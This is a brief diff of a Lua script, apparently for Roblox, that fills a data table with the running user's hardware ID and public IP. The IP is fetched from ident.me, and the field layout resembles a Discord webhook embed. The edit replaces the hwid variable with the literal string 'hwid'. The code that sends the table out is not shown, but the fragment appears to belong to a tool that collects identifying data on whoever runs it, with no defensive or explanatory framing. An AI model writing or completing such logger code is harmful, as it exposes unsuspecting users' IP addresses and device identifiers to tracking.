@@ -79,7 +79,7 @@ local data =
 					["inline"] = true
 				},
 				{ ["name"] = "Hwid:",
-				    ["value"] = hwid
+				    ["value"] = "hwid"
  },
  { ["name"] = "IP:",
      ["value"] = game:HttpGet("https://ident.me/", true)
